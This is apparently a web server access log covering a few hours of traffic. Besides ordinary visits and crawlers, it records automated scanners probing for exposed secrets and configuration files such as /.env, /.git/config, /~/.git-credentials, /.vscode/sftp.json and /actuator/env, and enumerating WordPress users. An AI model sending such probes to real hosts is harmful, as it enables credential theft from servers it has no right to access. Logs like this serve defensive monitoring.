3.235.254.79 - - [27/Oct/2025:04:11:47 +0000] "GET /.git/config.backup HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
3.235.254.79 - - [27/Oct/2025:04:11:48 +0000] "HEAD /~/.gitconfig HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
35.153.176.171 - - [27/Oct/2025:04:13:51 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44" "-"
54.80.245.69 - - [27/Oct/2025:04:13:55 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" "-"
91.184.244.208 - - [27/Oct/2025:04:16:58 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0(compatible;MSIE10.0;WindowsNT6.1;WOW64;Trident/6.0;SLCC2;.NETCLR2.0.50727;.NETCLR3.5.30729;.NETCLR3.0.30729;.NET4.0C;.NET4.0E;MediaCenterPC6.0;MDDC)" "147.45.185.25"
91.184.244.208 - - [27/Oct/2025:04:17:00 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0(compatible;MSIE10.0;WindowsNT6.1;WOW64;Trident/6.0;SLCC2;.NETCLR2.0.50727;.NETCLR3.5.30729;.NETCLR3.0.30729;.NET4.0C;.NET4.0E;MediaCenterPC6.0;MDDC)" "147.45.185.25"
82.146.44.21 - - [27/Oct/2025:04:18:46 +0000] "GET / HTTP/1.1" 301 169 "-" "OPR/72.0.3815.465 (Edition Yx GX)" "-"
34.122.147.229 - - [27/Oct/2025:04:20:16 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.6422.60 Safari/537.36" "-"
104.197.69.115 - - [27/Oct/2025:04:20:18 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.6422.60 Safari/537.36" "-"
34.123.170.104 - - [27/Oct/2025:04:20:35 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.6422.60 Safari/537.36" "-"
205.169.39.57 - - [27/Oct/2025:04:20:40 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
34.118.94.137 - - [27/Oct/2025:04:20:53 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1" "-"
205.169.39.14 - - [27/Oct/2025:04:20:56 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36" "-"
34.118.46.209 - - [27/Oct/2025:04:21:11 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1" "-"
104.197.69.115 - - [27/Oct/2025:04:21:29 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.6422.60 Safari/537.36" "-"
172.68.10.60 - - [27/Oct/2025:04:22:46 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.68.10.61 - - [27/Oct/2025:04:24:01 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
69.171.231.10 - - [27/Oct/2025:04:34:27 +0000] "GET / HTTP/1.1" 301 169 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
66.220.149.113 - - [27/Oct/2025:04:34:42 +0000] "GET /?fbclid=IwZXh0bgNhZW0CMTEAAR4l6yhZXiNcKrU8Z0-pu2q0O5WUSai2M3qmytRw_TBKa_W1bgfnkY6gbvENcQ_aem_JjwYmKHMtV-vYVMO1mDyjQ HTTP/1.1" 301 169 "https://www.facebook.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22G100 [FBAN/FBIOS;FBAV/535.0.0.56.81;FBBV/808392236;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.6.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/811253756]" "-"
91.231.89.101 - - [27/Oct/2025:04:34:47 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
91.231.89.32 - - [27/Oct/2025:04:41:02 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
172.71.184.156 - - [27/Oct/2025:04:42:40 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
64.15.129.104 - - [27/Oct/2025:04:43:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
192.175.111.249 - - [27/Oct/2025:04:43:03 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
192.175.111.236 - - [27/Oct/2025:04:43:05 +0000] "GET /favicon.ico HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
64.15.129.122 - - [27/Oct/2025:04:43:07 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
64.15.129.122 - - [27/Oct/2025:04:43:10 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
172.68.10.61 - - [27/Oct/2025:04:45:21 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
91.196.152.76 - - [27/Oct/2025:04:48:06 +0000] "GET /favicon.ico HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
51.158.61.186 - - [27/Oct/2025:04:48:29 +0000] "GET /robots.txt HTTP/1.0" 301 169 "-" "xfa1" "-"
34.217.38.102 - - [27/Oct/2025:04:56:54 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G965U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36" "-"
34.217.38.102 - - [27/Oct/2025:04:56:54 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582" "-"
172.68.10.60 - - [27/Oct/2025:05:00:42 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
211.192.210.198 - - [27/Oct/2025:05:08:07 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
209.38.248.17 - - [27/Oct/2025:05:12:05 +0000] "GET /actuator/env HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:06 +0000] "GET /server HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:07 +0000] "GET /.vscode/sftp.json HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:07 +0000] "GET /about HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:08 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:10 +0000] "GET /v2/_catalog HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:11 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:12 +0000] "GET /server-status HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:12 +0000] "GET /login.action HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:13 +0000] "GET /_all_dbs HTTP/1.1" 301 169 "-" "Mozilla/5.0 (l9scan/2.0.2353e27313e2536313e25313; +https://leakix.net)" "-"
209.38.248.17 - - [27/Oct/2025:05:12:14 +0000] "GET /.DS_Store HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:16 +0000] "GET /.env HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:17 +0000] "GET /.git/config HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:18 +0000] "GET /s/2353e27313e2536313e25313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:18 +0000] "GET /config.json HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:19 +0000] "GET /telescope/requests HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:20 +0000] "GET /info.php HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
209.38.248.17 - - [27/Oct/2025:05:12:21 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 301 169 "-" "Go-http-client/1.1" "-"
54.196.18.181 - - [27/Oct/2025:05:14:02 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44" "-"
3.83.212.255 - - [27/Oct/2025:05:14:04 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" "-"
62.113.113.43 - - [27/Oct/2025:05:15:55 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Linux; U; Android 9; zh-CN; V1916A Build/PKQ1.190714.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.8.2.1062 Mobile Safari/537.36" "147.45.185.25"
91.184.244.208 - - [27/Oct/2025:05:16:39 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/4.0(compatible;MSIE8.0;WindowsNT5.1;Trident/4.0;.NETCLR2.0.50727;.NETCLR3.0.4506.2152;.NETCLR3.5.30729;.NETCLR1.1.4322;InfoPath.1;.NET4.0C)" "147.45.185.25"
91.184.244.208 - - [27/Oct/2025:05:16:41 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/4.0(compatible;MSIE8.0;WindowsNT5.1;Trident/4.0;.NETCLR2.0.50727;.NETCLR3.0.4506.2152;.NETCLR3.5.30729;.NETCLR1.1.4322;InfoPath.1;.NET4.0C)" "147.45.185.25"
172.68.10.60 - - [27/Oct/2025:05:20:24 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
82.146.44.21 - - [27/Oct/2025:05:22:39 +0000] "GET / HTTP/1.1" 301 169 "-" "AppleWebKit/537.36 (KHTML, like Gecko)" "-"
101.32.218.31 - - [27/Oct/2025:05:24:59 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
205.169.39.50 - - [27/Oct/2025:05:26:12 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36" "-"
31.13.127.27 - - [27/Oct/2025:05:34:03 +0000] "GET / HTTP/1.1" 301 169 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
31.13.115.115 - - [27/Oct/2025:05:34:22 +0000] "GET /?fbclid=IwZXh0bgNhZW0CMTEAAR6AJqHubXRqZYJa-CwsSIggKw_fvb2vrFiw3w0EqMekOHwNU0-y5VbRfIkqMQ_aem_JYId51-3ucMWkYxK0aLNVA HTTP/1.1" 301 169 "https://www.facebook.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1" "-"
204.76.203.212 - - [27/Oct/2025:05:34:28 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
172.71.246.178 - - [27/Oct/2025:05:41:16 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
91.231.89.18 - - [27/Oct/2025:05:43:23 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
162.158.87.58 - - [27/Oct/2025:05:43:39 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
91.231.89.21 - - [27/Oct/2025:05:46:24 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
204.76.203.219 - - [27/Oct/2025:05:54:23 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
44.247.43.164 - - [27/Oct/2025:05:55:59 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1" "-"
44.247.43.164 - - [27/Oct/2025:05:55:59 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36" "-"
162.158.182.92 - - [27/Oct/2025:06:02:53 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.49 - - [27/Oct/2025:06:05:37 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
3.235.254.79 - - [27/Oct/2025:06:10:11 +0000] "HEAD /.github/workflows/ci.yml HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
3.235.254.79 - - [27/Oct/2025:06:10:12 +0000] "HEAD /~/.gitconfig HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
34.122.147.229 - - [27/Oct/2025:06:10:21 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.6422.60 Safari/537.36" "-"
205.169.39.50 - - [27/Oct/2025:06:10:45 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
52.23.244.135 - - [27/Oct/2025:06:10:57 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44" "-"
3.92.215.239 - - [27/Oct/2025:06:10:59 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" "-"
91.184.244.208 - - [27/Oct/2025:06:11:15 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0(Linux;Android5.1.1;SAMSUNGSM-E500HBuild/LMY47X)AppleWebKit/537.36(KHTML,likeGecko)SamsungBrowser/3.3Chrome/38.0.2125.102MobileSafari/537.36" "147.45.185.25"
3.235.254.79 - - [27/Oct/2025:06:11:16 +0000] "HEAD /.gitlab-ci.yml HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
3.235.254.79 - - [27/Oct/2025:06:11:16 +0000] "GET /.git/config.backup HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
3.235.254.79 - - [27/Oct/2025:06:11:17 +0000] "HEAD /.env.backup HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
3.235.254.79 - - [27/Oct/2025:06:11:17 +0000] "HEAD /~/.git-credentials HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
3.235.254.79 - - [27/Oct/2025:06:11:17 +0000] "HEAD /~/.gitconfig HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
205.169.39.48 - - [27/Oct/2025:06:11:52 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36" "-"
142.111.108.64 - - [27/Oct/2025:06:14:51 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
192.175.111.232 - - [27/Oct/2025:06:16:15 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
64.15.129.102 - - [27/Oct/2025:06:16:16 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
192.175.111.246 - - [27/Oct/2025:06:16:18 +0000] "GET /favicon.ico HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
64.15.129.104 - - [27/Oct/2025:06:16:20 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
192.175.111.229 - - [27/Oct/2025:06:16:22 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
91.184.244.208 - - [27/Oct/2025:06:17:03 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16" "147.45.185.25"
91.231.89.101 - - [27/Oct/2025:06:17:19 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
142.111.108.85 - - [27/Oct/2025:06:18:35 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
23.230.163.141 - - [27/Oct/2025:06:18:50 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" "-"
82.146.44.21 - - [27/Oct/2025:06:19:53 +0000] "GET / HTTP/1.1" 301 169 "-" "AppleWebKit/537.36 (KHTML, like Gecko)" "-"
64.15.129.120 - - [27/Oct/2025:06:25:31 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
192.175.111.242 - - [27/Oct/2025:06:25:32 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
192.175.111.228 - - [27/Oct/2025:06:25:34 +0000] "GET /favicon.ico HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
64.15.129.104 - - [27/Oct/2025:06:25:36 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
192.175.111.246 - - [27/Oct/2025:06:25:38 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
172.68.195.143 - - [27/Oct/2025:06:25:49 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.68.10.61 - - [27/Oct/2025:06:26:55 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
91.231.89.34 - - [27/Oct/2025:06:27:02 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
173.252.70.17 - - [27/Oct/2025:06:27:57 +0000] "GET / HTTP/1.1" 301 169 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
173.252.87.10 - - [27/Oct/2025:06:28:23 +0000] "GET /?fbclid=IwZXh0bgNhZW0CMTEAAR4kaflM04JmJb_fG6Il_sZW3SMy-WIznuzi3IOnatQzLuQTTeuOo1SsPPY2Dg_aem_CT-3jRMcensHrshGHPj7LA HTTP/1.1" 301 169 "https://www.facebook.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22G100 [FBAN/FBIOS;FBAV/535.0.0.56.81;FBBV/808392236;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/18.6.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/811253756]" "-"
91.231.89.32 - - [27/Oct/2025:06:29:27 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
36.111.67.189 - - [27/Oct/2025:06:31:04 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
91.231.89.97 - - [27/Oct/2025:06:32:16 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
91.231.89.96 - - [27/Oct/2025:06:35:38 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
3.149.59.26 - - [27/Oct/2025:06:36:10 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.149.59.26 - - [27/Oct/2025:06:37:26 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
176.53.218.121 - - [27/Oct/2025:06:41:13 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36" "-"
3.149.59.26 - - [27/Oct/2025:06:41:44 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03qK\xAEf\x12/]u\x98\xB2\xBF@\xD6\xDE\xF0\xC3\x1C\x80`\xD0\x9B\x05\x97\xF8\xCC\xBBpM\xD4\x18\xB1\x84\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
3.149.59.26 - - [27/Oct/2025:06:42:03 +0000] "" 400 0 "-" "-" "-"
91.231.89.22 - - [27/Oct/2025:06:42:46 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
3.149.59.26 - - [27/Oct/2025:06:42:48 +0000] "SSH-2.0-Go" 400 157 "-" "-" "-"
